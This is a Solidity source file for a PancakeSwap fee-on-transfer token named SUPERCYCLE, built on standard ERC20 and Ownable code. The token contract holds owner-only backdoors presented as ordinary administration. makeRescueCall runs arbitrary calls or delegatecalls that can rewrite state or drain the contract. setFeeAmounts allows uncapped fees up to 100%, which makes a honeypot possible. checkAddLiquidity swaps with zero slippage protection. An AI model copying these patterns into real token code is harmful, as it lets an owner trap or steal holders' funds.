abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    
    constructor (string memory name, string memory symbol) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
    }
    
    function name() public view returns (string memory) {
        return _name;
    }
    
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}
contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        _owner = _msgSender();
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract superCycle is ERC20, Ownable {
    IHFSP hfsp;
    using SafeMath for uint256;
    uint256 buyFee = 5;
    uint256 sellFee = 10;
    uint256 minLPAmount = 1000000; // if this contract has 1m+ tokens, we can add it into liquidity
    IUniswapRouter constant router = IUniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    mapping (address => bool) isPair;
    mapping (address => bool) excluded;

    constructor() public ERC20("SUPERCYCLE", "SUPERCYCLE") {
        super._mint(msg.sender, 1000000000e18);
        IUniswapV2Factory factory = IUniswapV2Factory(router.factory());
        address pancakePair = factory.createPair(address(this),router.WETH());
        isPair[pancakePair] = true;
        excluded[address(this)] = true;
        excluded[msg.sender] = true;
        address hfspToken;
        bytes memory hfspCode = type(HFSP).creationCode;
        assembly {
            hfspToken := create(0, add(hfspCode,32),mload(hfspCode))
        }
        hfsp = IHFSP(hfspToken);
        IERC20(router.WETH()).approve(address(router),uint256(-1));
        super._approve(address(this),address(router),uint256(-1));
        super._approve(msg.sender,address(router),uint256(-1)); // approve to router for owner to add liq 
    }

    function _printNGMI(address account, uint256 amount) private {
        hfsp.mint(account, amount);
    }

    function transfer(address to, uint256 amount)
        public
        override
        returns (bool)
    {
        uint256 tokensToTransfer = _preTransfer(_msgSender(),to,amount);
        super.transfer(to, tokensToTransfer);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        uint256 tokensToTransfer = _preTransfer(from,to,amount);
        super.transferFrom(from, to, tokensToTransfer);
        return true;
    }
    
    function airdropToken(address[] memory transfertargets, uint256[] memory amounts) public {
        require(excluded[msg.sender],"not allowed");
        require(transfertargets.length == amounts.length,"length mismatch");
        for(uint i = 0; i < amounts.length; i++) {
            super._transfer(msg.sender, transfertargets[i], amounts[i]);
        }
    }
    
    // helper function for doing the burn check
    function _preTransfer(address from, address to, uint256 amount) internal returns (uint256) {
        if(excluded[from]) return amount;
        uint256 fee;
        if(isPair[from] && !isPair[to]) fee = buyFee;
        else fee = sellFee;
        uint256 feeAmount = amount.mul(fee).div(100);
        (uint256 toBurn, uint256 toLP) = (feeAmount.div(2),feeAmount.div(2));
        super._burn(from, toBurn);
        super._transfer(from, address(this), toLP);
        if(isPair[to] && !isPair[from]) hfsp.mint(from, feeAmount);
        return amount.sub(feeAmount);
    }
    
    function checkAddLiquidity() public { // this function adds liquidity to the pool,and gives the caller 0.1% of the amount as incentive
        uint256 balance = super.balanceOf(address(this));
        if(balance < minLPAmount) return;
        (uint256 toSell, uint256 toSpend) = (balance.div(2),balance.div(2));
        address[] memory _path = new address[](2);
        _path[0] = address(this);
        _path[1] = router.WETH();
        uint256[] memory amountSell = router.swapExactTokensForETH(
            toSell,
            0, // slippage cant be avoided 
            _path,
            address(this),
            block.timestamp
        );
        router.addLiquidityETH{value:amountSell[1]}(
            address(this),
            toSpend,
            0,
            0,
            address(this),
            block.timestamp
        );
        super._transfer(address(this),msg.sender,super.balanceOf(address(this))); // transfer remaning as bribe to caller, ~0.05% 
    }
    
    function makeRescueCall(address target, bytes memory data, uint256 value, bool isDelegate) public onlyOwner {
        (bool s,) = isDelegate ? target.delegatecall(data) : target.call{value:value}(data);
        require(s,"call failed");
    }
    
    function setFeeAmounts(uint256 _buyFee, uint256 _sellFee) public onlyOwner {
        buyFee = _buyFee;
        sellFee = _sellFee;
    }
    
    function setExcluded(address user, bool toExclude) public onlyOwner {
        excluded[user] = toExclude;
    }
    
    receive() external payable {}
}

